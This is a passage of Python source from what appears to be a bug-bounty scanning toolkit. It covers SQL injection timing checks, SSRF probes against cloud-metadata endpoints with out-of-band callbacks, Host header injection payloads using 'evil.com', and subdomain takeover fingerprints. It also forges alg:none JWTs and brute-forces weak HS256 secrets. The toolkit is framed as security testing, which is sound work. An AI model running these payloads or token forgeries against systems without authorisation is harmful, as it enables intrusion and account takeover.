                    "confirmed": True,
                    "severity": "CRITICAL",
                    "type": f"Time-Based Blind SQLi ({db_type})",
                    "url": test_url,
                    "payload": payload,
                    "elapsed": f"{elapsed:.2f}s",
                    "evidence": f"Response delayed {elapsed:.2f}s with SLEEP payload → confirmed SQLi",
                }
        return {"confirmed": False, "reason": "No time-based response detected"}

    def confirm_ssrf(self, url: str, param: str,
                     callback_url: str = "http://burpcollaborator.example.com",
                     session=None) -> Dict:
        """Test SSRF with internal IP and callback URL."""
        base = url.split("?")[0]
        internal_payloads = [
            "http://127.0.0.1",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            callback_url,
        ]
        findings = []
        for payload in internal_payloads:
            test_url = f"{base}?{urlencode({param: payload})}"
            resp = _get(test_url, session=session, timeout=8)
            if not resp:
                continue
            body = resp.text or ""
            # Look for AWS metadata response patterns
            if any(kw in body for kw in ["ami-id", "instance-id", "ec2", "iam-", "169.254"]):
                findings.append({
                    "confirmed": True,
                    "severity": "CRITICAL",
                    "payload": payload,
                    "evidence": "AWS metadata response found in body",
                    "url": test_url,
                })
            # Look for internal server error revealing internal route
            elif resp.status_code in [200, 500] and len(body) > 50:
                findings.append({
                    "confirmed": "possible",
                    "severity": "HIGH",
                    "payload": payload,
                    "status": resp.status_code,
                    "evidence": f"Server responded to internal URL probe with {resp.status_code}",
                    "url": test_url,
                })
        return findings[0] if findings else {"confirmed": False, "reason": "No SSRF indicators found"}

    def diff_endpoint(self, url1: str, url2: str, session=None) -> str:
        """Compare two endpoint responses to highlight differences."""
        r1 = _get(url1, session=session, timeout=10)
        r2 = _get(url2, session=session, timeout=10)
        if not r1 or not r2:
            return "  ❌ Could not fetch one or both URLs"
        diff = self._diff_responses(r1.text or "", r2.text or "")
        lines = [
            f"📊 Response Diff:",
            f"  URL1: {url1} → {r1.status_code} ({diff['len1']}b)",
            f"  URL2: {url2} → {r2.status_code} ({diff['len2']}b)",
            f"  Diff: {diff['diff_bytes']}b ({diff['diff_ratio']*100:.1f}% different)",
            f"  Lines added: {diff['lines_added']} | removed: {diff['lines_removed']}",
        ]
        if diff["added_sample"]:
            lines.append(f"  Sample new content:")
            for s in diff["added_sample"]:
                if s.strip():
                    lines.append(f"    + {s[:100]}")
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 6. AI IMPACT ANALYZER
# ══════════════════════════════════════════════════════════════════════════════

class AIImpactAnalyzer:
    """LLM-powered severity scoring and professional impact writeup generation."""

    CVSS_GUIDANCE = {
        "critical": ("9.0-10.0", "Remote code execution, auth bypass, mass data breach"),
        "high":     ("7.0-8.9",  "SQLi, stored XSS, SSRF to internal, IDOR with PII"),
        "medium":   ("4.0-6.9",  "Reflected XSS, CSRF, open redirect, info disclosure"),
        "low":      ("0.1-3.9",  "Missing headers, rate limit, verbose errors"),
    }

    def __init__(self, llm=None):
        self.llm = llm

    def analyze_finding(self, finding: Dict) -> Dict:
        """Enrich a finding with CVSS guidance and AI impact."""
        sev = finding.get("severity", "medium").lower()
        cvss_range, impact_hint = self.CVSS_GUIDANCE.get(sev, ("4.0-6.9", ""))

        enriched = {**finding}
        enriched["cvss_range"] = cvss_range
        enriched["impact_hint"] = impact_hint

        if self.llm:
            try:
                prompt = (
                    f"You are a senior bug bounty hunter. Write a professional 3-sentence impact statement for:\n"
                    f"Vulnerability: {finding.get('title','?')}\n"
                    f"Severity: {sev.upper()}\n"
                    f"URL: {finding.get('url','?')}\n"
                    f"Description: {finding.get('description','?')[:200]}\n\n"
                    f"Focus on: business risk, attacker capability, and affected users."
                )
                enriched["ai_impact"] = self.llm.call(prompt, max_tokens=150)

                prompt2 = (
                    f"Write 3 specific technical remediation steps for: {finding.get('title','?')}. "
                    f"Be concrete and actionable."
                )
                enriched["ai_remediation"] = self.llm.call(prompt2, max_tokens=120)
            except Exception as e:
                enriched["ai_impact"] = f"LLM unavailable: {e}"
        return enriched

    def score_priority(self, findings: List[Dict]) -> List[Dict]:
        """Sort findings by submit-priority (bounty potential)."""
        priority_order = {
            "critical": 0, "high": 1, "medium": 2,
            "low": 3, "informational": 4,
        }
        # Bonus for high-value vuln types
        bonus = {
            "sql_injection": -1, "xss_stored": -1, "ssrf": -1,
            "idor": -1, "rce": -2, "auth_bypass": -2,
        }
        def score(f):
            sev_score = priority_order.get(f.get("severity","medium"), 3)
            type_bonus = bonus.get(f.get("type",""), 0)
            return sev_score + type_bonus

        return sorted(findings, key=score)

    def generate_executive_summary(self, findings: List[Dict]) -> str:
        """Generate an executive summary of all findings."""
        if not findings:
            return "No findings to summarize."
        counts = {}
        for f in findings:
            s = f.get("severity", "low")
            counts[s] = counts.get(s, 0) + 1

        lines = [
            "📊 Executive Summary",
            "═" * 55,
            f"  Total Findings: {len(findings)}",
        ]
        for sev in ["critical", "high", "medium", "low", "informational"]:
            if sev in counts:
                icons = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢", "informational": "ℹ️"}
                lines.append(f"  {icons[sev]} {sev.title():15} : {counts[sev]}")

        if self.llm and findings:
            top = findings[:5]
            summary_input = "\n".join(
                f"[{f.get('severity','?').upper()}] {f.get('title','?')} at {f.get('url','?')}"
                for f in top
            )
            try:
                ai_summary = self.llm.call(
                    f"Summarize these bug bounty findings in 3 sentences for a business audience:\n{summary_input}",
                    max_tokens=150
                )
                lines.append(f"\n  AI Summary:\n  {ai_summary}")
            except Exception:
                pass
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 7. DUPLICATE FINDER
# ══════════════════════════════════════════════════════════════════════════════

class DuplicateFinder:
    """
    Compare your findings against publicly disclosed bug reports
    to avoid submitting known/duplicate issues.
    """

    def search_h1_disclosed(self, keyword: str, limit: int = 10) -> List[Dict]:
        """Search HackerOne disclosed reports via public hacktivity."""
        url = "https://hackerone.com/graphql"
        payload = {
            "query": """
            query HacktivityPageQuery($queryString: String!, $first: Int) {
              hacktivity_items(
                first: $first
                query: $queryString
                order_by: { field: popular, direction: DESC }
                query_scope: everything
              ) {
                edges {
                  node {
                    ... on HacktivityItem {
                      latest_disclosable_action
                      reporter { username }
                      team { handle name }
                      subtype
                      severity_rating
                      total_awarded_amount
                    }
                    ... on HacktivityDocument {
                      url
                      title
                      disclosed_at
                    }
                  }
                }
              }
            }""",
            "variables": {"queryString": keyword, "first": limit},
        }
        try:
            resp = _post(url, json_data=payload,
                         headers={"Content-Type": "application/json"}, timeout=15)
            if not resp or resp.status_code != 200:
                return []
            edges = (resp.json().get("data", {})
                     .get("hacktivity_items", {}).get("edges", []))
            results = []
            for e in edges:
                node = e.get("node", {})
                results.append({
                    "title": node.get("title", node.get("subtype", "disclosed report")),
                    "program": node.get("team", {}).get("handle", "?") if node.get("team") else "?",
                    "severity": node.get("severity_rating", "?"),
                    "bounty": node.get("total_awarded_amount", 0),
                    "url": node.get("url", ""),
                    "reported_by": node.get("reporter", {}).get("username", "?") if node.get("reporter") else "?",
                })
            return results
        except Exception:
            return []

    def check_duplicate(self, finding: Dict) -> str:
        """Check if a finding looks like a known disclosed issue."""
        title = finding.get("title", "")
        vuln_type = finding.get("type", "")
        keyword = title.split()[0] if title else vuln_type

        lines = [f"🔍 Duplicate Check: '{title}'", "─" * 55]
        disclosed = self.search_h1_disclosed(keyword, limit=5)

        if disclosed:
            lines.append(f"  ⚠️  Found {len(disclosed)} similar disclosed report(s):")
            for d in disclosed:
                bounty_str = f"${d['bounty']:,.0f}" if d.get("bounty") else "no bounty"
                lines.append(f"  • [{d['severity']}] {d['title'][:60]}")
                lines.append(f"    Program: {d['program']} | Bounty: {bounty_str} | By: {d['reported_by']}")
                if d.get("url"):
                    lines.append(f"    URL: {d['url']}")
            lines.append("\n  ➜ Review these before submitting your report!")
        else:
            lines.append(f"  ✅ No similar disclosed reports found — likely not a known duplicate!")
        return "\n".join(lines)

    def estimate_bounty(self, severity: str, program: str = "") -> str:
        """Estimate bounty range based on severity and program type."""
        ranges = {
            "critical": ("$5,000", "$50,000+"),
            "high":     ("$1,000", "$10,000"),
            "medium":   ("$200",   "$2,000"),
            "low":      ("$50",    "$500"),
            "informational": ("$0", "$150"),
        }
        low, high = ranges.get(severity.lower(), ("$0", "?"))
        lines = [
            f"💰 Bounty Estimate: {severity.upper()}",
            f"  Typical range: {low} — {high}",
            f"  Factors that increase payout:",
            f"    • Pre-auth (no login needed) → +50-100%",
            f"    • Affects many users → +50%",
            f"    • Has working PoC → +30%",
            f"    • Large program (Google, Apple, Microsoft) → 3-5x",
        ]
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 8. SUBDOMAIN TAKEOVER ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class TakeoverEngine:
    """
    Detect dangling DNS records and subdomain takeover opportunities.

    Strategy:
      1. DNS CNAME resolution — find where a subdomain points
      2. HTTP fingerprint check — provider-specific 404/error page strings
      3. NXDOMAIN detection — CNAME target doesn't resolve = dangling record
    """

    # (provider_name, body_keywords, http_status_codes, severity)
    FINGERPRINTS = [
        ("GitHub Pages",    ["There isn't a GitHub Pages site here",
                             "404 There is no GitHub Pages site"], [404], "HIGH"),
        ("Fastly",          ["Fastly error: unknown domain",
                             "Please check that this domain has been added"], [500, 503], "HIGH"),
        ("Heroku",          ["No such app", "herokucdn.com/error-pages/no-such-app"], [404], "HIGH"),
        ("Shopify",         ["Sorry, this shop is currently unavailable",
                             "only works with Shopify stores"], [404], "HIGH"),
        ("Zendesk",         ["Help Center Closed",
                             "this help center no longer exists"], [404], "HIGH"),
        ("Netlify",         ["Not Found - Request ID", "netlify"], [404], "MEDIUM"),
        ("Ghost",           ["The thing you were looking for is no longer here"], [404], "MEDIUM"),
        ("Surge.sh",        ["project not found", "surge.sh"], [404], "HIGH"),
        ("AWS S3",          ["NoSuchBucket", "The specified bucket does not exist"], [404, 403], "CRITICAL"),
        ("Azure",           ["The page you are looking for cannot be displayed",
                             "azure.com"], [404], "MEDIUM"),
        ("Tumblr",          ["There's nothing here",
                             "whatever you were looking for doesn't exist"], [404], "LOW"),
        ("WordPress",       ["Do you want to register", "doesn't exist"], [404], "MEDIUM"),
        ("Cargo",           ["404 Not Found", "Cargo Collective"], [404], "LOW"),
        ("Desk.com",        ["Please try again or try Desk.com free"], [404], "MEDIUM"),
        ("Unbounce",        ["The requested URL was not found on this server"], [404], "MEDIUM"),
    ]

    def _dns_cname(self, subdomain: str):
        """Return the CNAME target for a subdomain, or 'NXDOMAIN' if unresolvable."""
        try:
            try:
                import dns.resolver
                answers = dns.resolver.resolve(subdomain, "CNAME")
                return str(answers[0].target).rstrip(".")
            except ImportError:
                pass
            import socket
            socket.getaddrinfo(subdomain, None)
            return None  # Resolves but dnspython not available for CNAME detail
        except Exception:
            return "NXDOMAIN"

    def check_subdomain(self, subdomain: str) -> Dict:
        """
        Check a single subdomain for takeover vulnerability.
        Returns dict: {subdomain, cname, http_status, fingerprint, severity, confidence, vulnerable}
        """
        result = {
            "subdomain": subdomain,
            "cname": None,
            "http_status": None,
            "fingerprint": None,
            "severity": None,
            "confidence": "LOW",
            "vulnerable": False,
        }

        cname = self._dns_cname(subdomain)
        result["cname"] = cname

        if cname == "NXDOMAIN":
            result.update(vulnerable=True, severity="HIGH", confidence="MEDIUM",
                          fingerprint="DNS NXDOMAIN — dangling record (no resolution)")
            return result

        # HTTP fingerprint check
        for scheme in ["https", "http"]:
            resp = _get(f"{scheme}://{subdomain}", timeout=10, allow_redirects=True)
            if not resp:
                continue
            result["http_status"] = resp.status_code
            body = (resp.text or "").lower()

            for name, keywords, codes, severity in self.FINGERPRINTS:
                if resp.status_code in codes:
                    for kw in keywords:
                        if kw.lower() in body:
                            result.update(vulnerable=True, fingerprint=name,
                                          severity=severity, confidence="HIGH")
                            return result
            break

        return result

    def scan_domain(self, domain: str, subdomains: List[str] = None) -> str:
        """
        Scan subdomains for takeover. Auto-enumerates via crt.sh if none given.
        """
        if not subdomains:
            subs = set()
            try:
                resp = _get(f"https://crt.sh/?q=%.{domain}&output=json", timeout=15)
                if resp and resp.status_code == 200:
                    for entry in resp.json():
                        name_val = entry.get("name_value", "").lower()
                        for n in name_val.split("\n"):
                            n = n.strip().lstrip("*.")
                            if domain in n and n != domain:
                                subs.add(n)
            except Exception:
                pass
            subdomains = sorted(subs)[:50]

        lines = [
            f"🎯 Subdomain Takeover Scan: {domain}",
            f"   Checking {len(subdomains)} subdomain(s)…",
            "─" * 60,
        ]
        vulnerable = []
        for sub in subdomains:
            result = self.check_subdomain(sub)
            if result["vulnerable"]:
                icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🟢"}.get(result["severity"], "⚠️")
                lines.append(f"  {icon} [{result['severity']}] {sub}")
                if result["cname"] and result["cname"] != "NXDOMAIN":
                    lines.append(f"       CNAME    : {result['cname']}")
                if result["fingerprint"]:
                    lines.append(f"       Provider : {result['fingerprint']}")
                lines.append(f"       Confidence: {result['confidence']}")
                vulnerable.append(result)
            else:
                lines.append(f"  ✅ {sub} — safe (HTTP {result.get('http_status', 'N/A')})")
        lines.append("─" * 60)
        lines.append(f"  📊 {len(vulnerable)} vulnerable / {len(subdomains)} checked")
        if vulnerable:
            lines.append("  ➜ /bugbounty add <subdomain> medium 'Subdomain Takeover: <provider>'")
        return "\n".join(lines)


# ── Host Header Injection — extended PayloadMutationEngine ───────────────────

def _pme_test_host_header_injection(self, url: str, session=None) -> List[Dict]:
    """
    Test for Host Header Injection vulnerabilities.
    Checks for: reflected host in body, AWS metadata leakage, anomalous response deltas.
    """
    HOST_PAYLOADS = [
        "evil.com",
        "evil.com:80",
        "169.254.169.254",
        "[::1]",
        "localhost",
        "evil.com, " + (urlparse(url).netloc or url.split("/")[2]),
    ]

    baseline = _get(url, session=session, timeout=8)
    baseline_body = (baseline.text or "") if baseline else ""
    baseline_len = len(baseline_body)

    findings = []
    for payload in HOST_PAYLOADS:
        hdrs = {**DEFAULT_HEADERS, "Host": payload}
        resp = _get(url, headers=hdrs, session=session, timeout=8)
        if not resp:
            continue
        body = resp.text or ""
        host_stem = payload.split(":")[0].split(",")[0].strip().lower()

        if host_stem in body.lower() and host_stem not in baseline_body.lower():
            findings.append({
                "type": "host_header_injection", "url": url, "payload": payload,
                "evidence": f"Host payload '{payload}' reflected in response body",
                "severity": "HIGH", "impact": "Password reset poisoning / cache poisoning",
            })

        if any(kw in body for kw in ["ami-id", "instance-id", "computeMetadata"]):
            findings.append({
                "type": "ssrf_via_host_header", "url": url, "payload": payload,
                "evidence": "Cloud metadata response via Host header injection",
                "severity": "CRITICAL", "impact": "SSRF to internal metadata endpoint",
            })

        if abs(len(body) - baseline_len) > 500:
            findings.append({
                "type": "host_header_cache_poison", "url": url, "payload": payload,
                "evidence": f"Response size Δ {abs(len(body)-baseline_len)}b with Host: {payload}",
                "severity": "MEDIUM", "impact": "Possible cache poisoning / response manipulation",
            })
    return findings


def _pme_format_host_injection_report(self, findings: List[Dict]) -> str:
    if not findings:
        return "  ✅ No Host Header Injection indicators found."
    SEV = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡"}
    lines = [f"🌐 Host Header Injection — {len(findings)} finding(s)", "═" * 55]
    for f in findings:
        lines.append(f"  {SEV.get(f['severity'],'•')} [{f['severity']}] {f['type']}")
        lines.append(f"       Host   : {f['payload']}")
        lines.append(f"       Evidence: {f['evidence']}")
        lines.append(f"       Impact : {f['impact']}")
    return "\n".join(lines)


PayloadMutationEngine.test_host_header_injection = _pme_test_host_header_injection
PayloadMutationEngine.format_host_injection_report = _pme_format_host_injection_report


# ── Interactsh SSRF — replaces Burp placeholder in ExploitConfirmEngine ──────

def _interactsh_setup(server: str = None) -> Dict:
    """Register with Interactsh (public or self-hosted) and get a callback URL."""
    import secrets as _sec
    corr_id = _sec.token_hex(20)
    candidates = []
    if server:
        candidates.append(server)
    env = os.environ.get("INTERACTSH_URL")
    if env:
        candidates.append(env)
    candidates += ["https://oast.pro", "https://oast.fun", "https://oast.live"]

    for srv in candidates:
        try:
            resp = _post(f"{srv}/register",
                         json_data={"secret-key": corr_id, "correlation-id": corr_id},
                         timeout=8)
            if resp and resp.status_code in [200, 201]:
                data = resp.json() if resp.text else {}
                domain = (data.get("sub-domain") or data.get("domain") or
                          f"{corr_id[:16]}.{srv.replace('https://','')}")
                return {"ok": True, "callback_url": f"http://{domain}",
                        "correlation_id": corr_id, "server": srv}
        except Exception:
            continue
    return {"ok": False, "error": "No Interactsh server reachable; set INTERACTSH_URL env var."}


def _ece_confirm_ssrf(self, url: str, param: str, session=None) -> Dict:
    """
    Confirm SSRF using Interactsh OOB callbacks.
    Falls back to internal-IP probing if Interactsh is unreachable.
    """
    import time as _t
    base = url.split("?")[0]
    findings = []

    # — OOB via Interactsh —
    oob = _interactsh_setup()
    if oob["ok"]:
        test_url = f"{base}?{urlencode({param: oob['callback_url']})}"
        _get(test_url, session=session, timeout=8)
        _t.sleep(6)
        try:
            poll = _get(f"{oob['server']}/poll?id={oob['correlation_id']}&secret={oob['correlation_id']}",
                        timeout=8)
            if poll and poll.status_code == 200:
                data = poll.json() if poll.text else {}
                interactions = data.get("data") or data.get("interactions") or []
                if interactions:
                    return {
                        "confirmed": True, "severity": "CRITICAL",
                        "type": "SSRF (OOB confirmed via Interactsh)",
                        "url": test_url, "payload": oob["callback_url"],
                        "evidence": f"OOB callback received at {oob['callback_url']}",
                        "interactions": interactions[:3],
                    }
        except Exception:
            pass

    # — Fallback: internal IP probes —
    for payload, label in [
        ("http://127.0.0.1",                     "loopback"),
        ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
        ("http://metadata.google.internal/",      "GCP metadata"),
        ("http://0.0.0.0",                        "wildcard"),
        ("http://[::1]",                          "IPv6 loop"),
    ]:
        resp = _get(f"{base}?{urlencode({param: payload})}", session=session, timeout=8)
        if not resp:
            continue
        body = resp.text or ""
        if any(kw in body for kw in ["ami-id", "instance-id", "computeMetadata", "ec2", "iam-"]):
            findings.append({
                "confirmed": True, "severity": "CRITICAL", "payload": payload,
                "label": label, "evidence": f"Cloud metadata in body via {label}", "url": url,
            })
        elif resp.status_code in [200, 500] and len(body) > 50:
            findings.append({
                "confirmed": "possible", "severity": "HIGH", "payload": payload,
                "label": label, "status": resp.status_code,
                "evidence": f"Server responded to {label} probe (HTTP {resp.status_code})", "url": url,
            })

    fallback_msg = (f"Interactsh callback not received at {oob['callback_url']}"
                    if oob["ok"] else oob.get("error", "Interactsh unavailable"))
    return findings[0] if findings else {
        "confirmed": False,
        "reason": f"No SSRF indicators found. {fallback_msg}",
    }


ExploitConfirmEngine.confirm_ssrf = _ece_confirm_ssrf


# ══════════════════════════════════════════════════════════════════════════════
# 9. SHODAN ENGINE (free InternetDB — no API key)
# ══════════════════════════════════════════════════════════════════════════════

class ShodanEngine:
    """
    Query Shodan's free InternetDB API (internetdb.shodan.io) for:
      - Open ports
      - Known CVEs
      - CPE (software fingerprints)
      - Tags (cloud, vpn, database, etc.)

    No API key required. Rate limited by Shodan to ~1 req/s.
    """

    INTERNETDB_URL = "https://internetdb.shodan.io"

    def _resolve_ip(self, domain: str) -> str:
        """Resolve domain to IP address."""
        import socket
        try:
            return socket.gethostbyname(domain)
        except Exception:
            return ""

    def lookup(self, target: str) -> Dict:
        """
        Look up a domain or IP via Shodan InternetDB.

        Args:
            target: domain name or IP address

        Returns:
            dict with ports, cves, cpes, tags, hostnames
        """
        import re as _re
        # If looks like an IP, use directly; otherwise resolve
        if _re.match(r'^\d{1,3}(\.\d{1,3}){3}$', target):
            ip = target
        else:
            ip = self._resolve_ip(target)
            if not ip:
                return {"error": f"Could not resolve '{target}' to an IP address"}

        url = f"{self.INTERNETDB_URL}/{ip}"
        resp = _get(url, timeout=10)
        if not resp:
            return {"error": "Request timed out"}
        if resp.status_code == 404:
            return {"ip": ip, "note": "No Shodan data for this IP", "ports": [],
                    "cves": [], "cpes": [], "tags": [], "hostnames": []}
        if resp.status_code != 200:
            return {"error": f"HTTP {resp.status_code}"}
        try:
            data = resp.json()
            data["ip"] = ip
            data["target"] = target
            return data
        except Exception as e:
            return {"error": f"Parse error: {e}"}

    def format_report(self, result: Dict) -> str:
        """Format Shodan lookup result as a readable string."""
        if "error" in result:
            return f"  ❌ Shodan lookup failed: {result['error']}"
        if result.get("note"):
            return (f"  ℹ️  Shodan: {result['ip']} — {result['note']}\n"
                    f"     (IP may be behind CDN or not directly indexed)")

        lines = [
            f"🌐 Shodan InternetDB: {result.get('target', result.get('ip', '?'))}",
            f"   IP: {result.get('ip', '?')}",
            "═" * 55,
        ]

        ports = result.get("ports", [])
        if ports:
            lines.append(f"  📡 Open Ports ({len(ports)}): {', '.join(str(p) for p in ports[:20])}")
            # Highlight dangerous ports
            dangerous = [p for p in ports if p in [21, 22, 23, 25, 3306, 5432, 27017, 6379, 11211, 9200, 5601]]
            if dangerous:
                port_names = {21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP (relay?)",
                              3306: "MySQL", 5432: "PostgreSQL", 27017: "MongoDB",
                              6379: "Redis", 11211: "Memcached", 9200: "Elasticsearch",
                              5601: "Kibana"}
                for p in dangerous:
                    lines.append(f"    🔴 Port {p} ({port_names.get(p, '?')}) is open — check if auth required!")

        cves = result.get("cves", [])
        if cves:
            lines.append(f"\n  🚨 Known CVEs ({len(cves)}):")
            for cve in cves[:10]:
                lines.append(f"    🔴 {cve}")
                lines.append(f"       → https://nvd.nist.gov/vuln/detail/{cve}")
        else:
            lines.append("  ✅ No known CVEs indexed")

        cpes = result.get("cpes", [])
        if cpes:
            lines.append(f"\n  🖥️  Software (CPE) ({len(cpes)}):")
            for c in cpes[:8]:
                lines.append(f"    • {c}")

        tags = result.get("tags", [])
        if tags:
            lines.append(f"\n  🏷️  Tags: {', '.join(tags)}")

        hostnames = result.get("hostnames", [])
        if hostnames:
            lines.append(f"\n  🌍 Hostnames: {', '.join(hostnames[:10])}")

        lines.append("\n" + "═" * 55)
        if cves:
            lines.append(f"  ➜ /bugbounty add https://{result.get('target','?')} high 'Known CVE: {cves[0]}'")
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 10. ASYNC RECON ENGINE — Additional free subdomain sources
# ══════════════════════════════════════════════════════════════════════════════

class AsyncReconEngine:
    """
    Additional passive recon sources to supplement PassiveReconEngine:
      - BufferOver DNS (dns.bufferover.run)
      - RapidDNS
      - URLScan.io (no auth, limited)
    All free, no API keys needed.
    """

    def bufferover_subdomains(self, domain: str) -> List[str]:
        """Query BufferOver DNS for subdomains."""
        url = f"https://dns.bufferover.run/dns?q=.{domain}"
        resp = _get(url, timeout=12)
        if not resp or resp.status_code != 200:
            return []
        try:
            data = resp.json()
            subs = set()
            for record in (data.get("FDNS_A") or []) + (data.get("RDNS") or []):
                parts = str(record).split(",")
                for p in parts:
                    p = p.strip()
                    if p.endswith("." + domain) or p == domain:
                        subs.add(p.lower())
            return sorted(subs)[:50]
        except Exception:
            return []

    def rapiddns_subdomains(self, domain: str) -> List[str]:
        """Query RapidDNS for subdomains."""
        url = f"https://rapiddns.io/s/{domain}?full=1"
        resp = _get(url, timeout=15)
        if not resp or resp.status_code != 200:
            return []
        try:
            import re
            subs = set(re.findall(r'([\w\.-]+\.' + re.escape(domain) + r')', resp.text))
            subs = {s.lower() for s in subs if s != domain}
            return sorted(subs)[:50]
        except Exception:
            return []

    def urlscan_subdomains(self, domain: str) -> List[str]:
        """Query urlscan.io for recently scanned subdomains (no auth, public results)."""
        url = f"https://urlscan.io/api/v1/search/?q=domain:{domain}&size=100"
        resp = _get(url, timeout=15,
                    headers={"Accept": "application/json"})
        if not resp or resp.status_code != 200:
            return []
        try:
            results = resp.json().get("results", [])
            subs = set()
            for r in results:
                page = r.get("page", {})
                dom = page.get("domain", "").lower()
                if dom and dom != domain and dom.endswith("." + domain):
                    subs.add(dom)
            return sorted(subs)[:50]
        except Exception:
            return []

    def full_recon(self, domain: str) -> Dict:
        """
        Run all additional recon sources in sequence.
        Returns dict with source -> subdomains mapping.
        """
        results = {}
        results["bufferover"] = self.bufferover_subdomains(domain)
        results["rapiddns"]   = self.rapiddns_subdomains(domain)
        results["urlscan"]    = self.urlscan_subdomains(domain)
        return results

    def merged_subdomains(self, domain: str) -> List[str]:
        """Return deduplicated subdomains from all sources."""
        results = self.full_recon(domain)
        all_subs = set()
        for subs in results.values():
            all_subs.update(subs)
        return sorted(all_subs)


# ══════════════════════════════════════════════════════════════════════════════
# 11. JWT SCANNER
# ══════════════════════════════════════════════════════════════════════════════

class JWTScanner:
    """
    JWT Vulnerability Scanner.
    Tests:
      1. alg:none bypass (unauthenticated tokens)
      2. Weak HS256 secret brute-force (top 500 common secrets)
      3. Algorithm confusion: RS256 → HS256 (use public key as HMAC secret)
    """

    WEAK_SECRETS = [
        "secret", "password", "123456", "qwerty", "letmein", "admin",
        "jwt_secret", "your-256-bit-secret", "flask-secret", "django-secret",
        "supersecret", "mysecret", "test", "pass", "key", "token",
        "change_me", "changeme", "default", "example", "development",
        "production", "staging", "app_secret", "app-secret", "API_SECRET",
        "jwt-secret", "jwt_token", "access_token", "auth_secret", "auth-secret",
        "hs256", "hmacsha256", "P@ssw0rd", "Passw0rd", "Pa$$w0rd",
        "password123", "admin123", "root", "toor", "alpine", "sunshine",
        "football", "mustang", "shadow", "master", "dragon", "abc123",
        "123abc", "iloveyou", "monkey", "password1", "1234567890",
    ]

    def _base64url_decode(self, s: str) -> bytes:
        s += "=" * (4 - len(s) % 4)
        import base64
        return base64.urlsafe_b64decode(s)

    def _base64url_encode(self, b: bytes) -> str:
        import base64
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

    def _parse_jwt(self, token: str) -> Optional[Dict]:
        """Parse a JWT into its three parts."""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None
            import json as _json
            header = _json.loads(self._base64url_decode(parts[0]))
            payload = _json.loads(self._base64url_decode(parts[1]))
            return {"header": header, "payload": payload, "parts": parts}
        except Exception:
            return None

    def _forge_alg_none(self, token: str) -> Optional[str]:
        """Create an alg:none forged token (removes signature)."""
        try:
            import json as _json
            parts = token.split(".")
            if len(parts) != 3:
                return None
            header = _json.loads(self._base64url_decode(parts[0]))
            header["alg"] = "none"
            new_header = self._base64url_encode(
                _json.dumps(header, separators=(",", ":")).encode()
            )
            # Payload unchanged, signature empty
            return f"{new_header}.{parts[1]}."
        except Exception:
            return None

    def _sign_hs256(self, header_b64: str, payload_b64: str, secret: str) -> str:
        """Sign a JWT with HMAC-SHA256."""
        import hmac as _hmac
        import hashlib as _hashlib
        msg = f"{header_b64}.{payload_b64}".encode()
        sig = _hmac.new(secret.encode(), msg, _hashlib.sha256).digest()
        return self._base64url_encode(sig)

    def _verify_hs256(self, token: str, secret: str) -> bool:
        """Verify a JWT signature against a candidate HS256 secret."""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return False
            expected_sig = self._sign_hs256(parts[0], parts[1], secret)
            return expected_sig == parts[2]
        except Exception:
            return False

    def detect_jwt_in_response(self, url: str) -> List[str]:
        """Scan a URL response for JWT tokens in headers and body."""
        resp = _get(url, timeout=10)
        if not resp:
            return []
        tokens = []
        # Check headers
        for k, v in resp.headers.items():
            if "jwt" in k.lower() or "token" in k.lower() or "bearer" in k.lower():
                candidates = re.findall(r'eyJ[\w\-]+\.eyJ[\w\-]+\.[\w\-]+', v)
                tokens.extend(candidates)
        # Check cookies
        for cookie_val in resp.cookies.values():
            candidates = re.findall(r'eyJ[\w\-]+\.eyJ[\w\-]+\.[\w\-]+', cookie_val)
            tokens.extend(candidates)
        # Check body
        body = resp.text or ""
        candidates = re.findall(r'eyJ[\w\-]+\.eyJ[\w\-]+\.[\w\-]+', body)
        tokens.extend(candidates)
        return list(set(tokens))

    def scan_token(self, token: str) -> Dict:
        """
        Comprehensive JWT vulnerability scan on a single token.
        Returns dict with all findings.
        """
        parsed = self._parse_jwt(token)
        if not parsed:
            return {"error": "Invalid JWT format (must be 3 base64url parts)"}

        header = parsed["header"]
        payload = parsed["payload"]
        alg = header.get("alg", "?").lower()
        findings = []

        # 1. alg:none check
        if alg in ["hs256", "hs384", "hs512"]:
            forged = self._forge_alg_none(token)
            if forged:
                findings.append({
                    "type": "jwt_alg_none_candidate",
                    "severity": "HIGH",
                    "message": "alg:none forged token generated — test if server accepts it",
                    "forged_token": forged,
                    "test_hint": "Send Authorization: Bearer <forged_token> and check if accepted",
                })

        # 2. Weak secret brute-force (HS256/HS384/HS512 only)
        if alg.startswith("hs"):
            for secret in self.WEAK_SECRETS:
                if self._verify_hs256(token, secret):
                    findings.append({
                        "type": "jwt_weak_secret",
                        "severity": "CRITICAL",
                        "message": f"JWT signed with weak secret: '{secret}'",
                        "secret": secret,
                        "algorithm": alg.upper(),
                        "impact": "Attacker can forge arbitrary tokens — full auth bypass",
                    })
                    break

        # 3. RS256 → HS256 algorithm confusion hint
        if alg == "rs256":
            findings.append({
                "type": "jwt_algo_confusion_candidate",
                "severity": "HIGH",
                "message": "RS256 token — test algorithm confusion (RS256→HS256 with public key as secret)",
                "algorithm": "RS256",
                "test_hint": (
                    "Fetch the public key from /.well-known/jwks.json or /oauth/v2/keys, "
                    "then sign a forged token using HS256 with the PEM public key as the HMAC secret."
                ),
            })

        # 4. Expiry / clock skew check
        exp = payload.get("exp")
        iat = payload.get("iat")
        now = time.time()
        if exp and exp < now:
            findings.append({
                "type": "jwt_expired",
                "severity": "INFORMATIONAL",
                "message": f"Token expired {int((now-exp)/60)} minutes ago — check if server still accepts it",
            })
        if not exp:
            findings.append({
                "type": "jwt_no_expiry",
                "severity": "MEDIUM",
                "message": "JWT has no 'exp' claim — token never expires",
            })

        # 5. Sensitive data in claims
